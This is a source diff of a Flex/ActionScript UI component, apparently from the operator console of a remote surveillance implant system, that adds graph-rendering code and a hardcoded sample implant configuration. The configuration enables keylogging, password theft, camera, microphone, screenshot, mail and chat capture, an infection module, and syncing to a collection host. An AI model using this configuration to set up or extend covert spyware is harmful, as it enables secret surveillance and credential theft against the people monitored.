@@ -2,14 +2,159 @@
 <s:Group xmlns:fx="http://ns.adobe.com/mxml/2009"
          xmlns:s="library://ns.adobe.com/flex/spark"
          xmlns:mx="library://ns.adobe.com/flex/mx"
-         width="100%" height="100%">
+         width="100%" height="100%" creationComplete="init()">
+  
+  <s:layout>
+    <s:VerticalLayout horizontalAlign="center" verticalAlign="middle"/>
+  </s:layout>
 
   <fx:Script>
     <![CDATA[
+      import com.adobe.serialization.json.JSON;
+      
       import it.ht.rcs.console.operations.OperationsSection;
+      import it.ht.rcs.console.operations.main.views.configuration.renderers.EventRenderer;
       
       [Bindable]
       public var section:OperationsSection;
+      
+      public var config:Object = JSON.decode('{"modules":[{"module":"application"},{"module":"call","buffer":524288,"compression":5},{"module":"camera","quality":"med"},{"module":"chat"},{"module":"clipboard"},{"module":"crisis","network":{"enabled":true,"processes":null},"hook":{"enabled":true,"processes":null}},{"module":"device"},{"module":"file","open":false,"capture":false,"minsize":1,"maxsize":500000,"date":"2011-05-26 09:04:14","accept":null,"deny":null},{"module":"infection","local":false,"usb":false,"vm":0,"mobile":false},{"module":"keylog"},{"module":"messages","mail":{"enabled":true,"filter":{"history":true,"maxsize":30720,"datefrom":"2011-05-26 09:04:14","dateto":"0000-00-00 00:00:00"}}},{"module":"mic","autosense":false,"silence":5,"threshold":0.22,"vad":false,"vadthreshold":50},{"module":"mouse","width":40,"height":40},{"module":"addressbook"},{"module":"calendar"},{"module":"password"},{"module":"position","gps":false,"cell":false,"wifi":true},{"module":"print","quality":"med"},{"module":"snapshot","onlywindow":false,"quality":"med"},{"module":"url"}],"actions":[{"desc":"Synchronize","subactions":[{"action":"synchronize","stop":false,"host":"192.168.100.100","bandwidth":1024000,"mindelay":0,"maxdelay":0,"wifi":false,"cell":false}]},{"desc":"Uninstall","subactions":[{"action":"uninstall"}]},{"desc":"pippi","subactions":[{"action":"execute","command":"c:\\notepad.exe"}]},{"desc":"STARTUP","_mig":true,"subactions":[{"action":"module","status":"start","module":"device"},{"action":"module","status":"start","module":"infection"}]},{"desc":"camera iteration","_mig":true,"subactions":[{"action":"module","status":"start","module":"camera"}]},{"desc":"position iteration","_mig":true,"subactions":[{"action":"module","status":"start","module":"position"}]},{"desc":"snapshot iteration","_mig":true,"subactions":[{"action":"module","status":"start","module":"snapshot"}]}],"events":[{"start":0,"enabled":true,"event":"timer","desc":"timer","ts":"00:00:00","te":"23:59:59","repeat":0,"delay":60},{"start":0,"enabled":true,"event":"process","desc":"process","window":false,"focus":false,"process":"notepad.exe"},{"start":0,"enabled":true,"event":"process","desc":"process","window":false,"focus":false,"process":"TextEdit"},{"enabled":true,"event":"process","desc":"process","end":1,"window":false,"focus":false,"process":"*calc*"},{"start":2,"enabled":true,"event":"process","desc":"process","window":false,"focus":false,"process":"provo.exe"},{"event":"timer","desc":"On Startup","enabled":true,"ts":"00:00:00","te":"23:59:59","start":3},{"event":"timer","_mig":true,"desc":"camera loop","enabled":false,"ts":"00:00:00","te":"23:59:59","repeat":4,"delay":15,"iter":50},{"event":"timer","_mig":true,"desc":"position loop","enabled":false,"ts":"00:00:00","te":"23:59:59","repeat":5,"delay":300},{"event":"timer","_mig":true,"desc":"snapshot loop","enabled":true,"ts":"00:00:00","te":"23:59:59","repeat":6,"delay":6000}],"globals":{"quota":{"min":524288000,"max":1048576000},"wipe":false,"type":"DESKTOP","migrated":true,"version":20111231,"nohide":[]}}');
+      
+      private function init():void
+      {
+      }
+      
+      private var map:Dictionary;
+      
+      public function buildGraph():void
+      {
+        var nodes:Vector.<EventRenderer> = new Vector.<EventRenderer>();
+        for each (var el:Object in config.events)
+          nodes.push(new EventRenderer(el));
+        
+//        var collectors:Vector.<CollectorRenderer> = new Vector.<CollectorRenderer>();
+//        for each (var node:CollectorRenderer in nodes) {
+//          if (node.collector.type == 'local')
+//            collectors.push(node);
+//          var nextHop:CollectorRenderer = node.collector.next ? getRendererById(node.collector.next[0], nodes) : null;
+//          node.nextHop = nextHop;
+//        }
+      }
+      
+      private var events:Vector.<EventRenderer> = new Vector.<EventRenderer>();
+      public function rebuildGraph():void
+      {
+        removeAllElements();
+        
+        map = new Dictionary();
+        
+        for each (var er:EventRenderer in events)
+        {
+          addElement(er);
+          map[er.event] = er;
+        }
+        
+        invalidateSize();
+        invalidateDisplayList();
+        
+      }
+      
+      override protected function measure():void
+      {
+        super.measure();
+        
+//        if (_db != null && _db.collectors.length > 0)
+//        {
+//          
+//          measuredWidth = measuredMinWidth = (_db.collectors[0].measuredWidth * _db.collectors.length) + (COLLECTORS_DISTANCE * (_db.collectors.length - 1));
+//          
+//          var maxBranch:Number = 0, branch:Number = 0, nextHop:CollectorRenderer;
+//          for each (var coll:CollectorRenderer in _db.collectors)
+//          {
+//            branch = BOTTOM_DISTANCE + _db.height + VERTICAL_DISTANCE;
+//            nextHop = coll.nextHop;
+//            while (nextHop != null)
+//            {
+//              branch += VERTICAL_DISTANCE;
+//              nextHop = nextHop.nextHop;
+//            }
+//            branch += IP_VERTICAL_DISTANCE;
+//            maxBranch = branch > maxBranch ? branch : maxBranch;
+//          }
+//          measuredHeight = measuredMinHeight = maxBranch;
+//          
+//        }
+      }
+      
+      override protected function updateDisplayList(unscaledWidth:Number, unscaledHeight:Number):void
+      {
+        
+        super.updateDisplayList(unscaledWidth, unscaledHeight);
+        
+        var _width:Number = unscaledWidth > measuredWidth ? unscaledWidth : measuredWidth;
+        var _height:Number = unscaledHeight > measuredHeight ? unscaledHeight : measuredHeight;
+        
+        graphics.lineStyle(1, 0x222222, 1, true);
+        
+//        if (_db != null)
+//        {
+//          
+//          _db.move(_width / 2 - _db.measuredWidth / 2, _height - BOTTOM_DISTANCE - _db.measuredHeight);
+//          
+//          // Where to draw the first collector?
+//          if (_db.collectors.length > 0)
+//          {
+//            var offsetFromCenter:int = 0;
+//            var renderer:CollectorRenderer = _db.collectors[0];
+//            if (_db.collectors.length % 2 == 0)
+//              offsetFromCenter = _width / 2 - (_db.collectors.length / 2 * (COLLECTORS_DISTANCE + renderer.measuredWidth)) + COLLECTORS_DISTANCE / 2;
+//            else
+//              offsetFromCenter = _width / 2 - (Math.floor(_db.collectors.length / 2) * (COLLECTORS_DISTANCE + renderer.measuredWidth)) - renderer.measuredWidth / 2;
+//          }
+//          // Draw collectors
+//          for (var collectorIndex:int = 0; collectorIndex < _db.collectors.length; collectorIndex++)
+//          {
+//            
+//            var collector:CollectorRenderer = _db.collectors[collectorIndex];
+//            
+//            var cX:int = offsetFromCenter + collectorIndex * (COLLECTORS_DISTANCE + collector.measuredWidth) + collector.measuredWidth / 2;
+//            var cY:int = _db.y - VERTICAL_DISTANCE;
+//            collector.move(cX - collector.measuredWidth / 2, cY);
+//            
+//            graphics.moveTo(_width / 2, _height - BOTTOM_DISTANCE - _db.measuredHeight / 2);
+//            graphics.lineTo(cX, cY + collector.measuredHeight);
+//            
+//            var anonymizer:CollectorRenderer = collector.nextHop;
+//            while (anonymizer != null)
+//            {
+//              
+//              graphics.moveTo(cX, cY - VERTICAL_DISTANCE + anonymizer.measuredHeight);
+//              graphics.lineTo(cX, cY);
+//              
+//              cY -= VERTICAL_DISTANCE;
+//              anonymizer.move(cX - anonymizer.measuredWidth / 2, cY);
+//              
+//              if (anonymizer.nextHop == null)
+//                break;
+//              
+//              anonymizer = anonymizer.nextHop;
+//              
+//            } // End anonymizer
+//            
+//            // Draw the IPs
+//            if (ips.length > 0)
+//            {
+//              var ip:IPRenderer = ips.getItemAt(collectorIndex) as IPRenderer;
+//              graphics.moveTo(cX, cY - IP_VERTICAL_DISTANCE + ip.measuredHeight);
+//              graphics.lineTo(cX, cY);
+//              ip.move(cX - ip.measuredWidth / 2, cY - IP_VERTICAL_DISTANCE);
+//            }
+//            
+//          } // End collectors
+//          
+//        } // End db
+        
+      }
     ]]>
   </fx:Script>
   
